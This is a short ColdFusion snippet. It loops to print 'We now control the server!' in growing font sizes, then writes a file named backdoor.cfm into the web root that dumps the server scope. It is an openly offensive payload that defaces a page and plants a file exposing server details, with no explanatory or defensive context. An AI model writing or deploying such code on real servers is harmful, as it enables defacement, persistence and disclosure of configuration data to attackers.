<cfloop from="1" to="100" index="i">
	<cfoutput><div style="font-size:#i+(i*2/4)#px;">We now control the server!</div></cfoutput>
</cfloop>
<cfset fileWrite(ExpandPath("./backdoor.cfm"), "<" & "cfdump var=""##server##""" & ">")>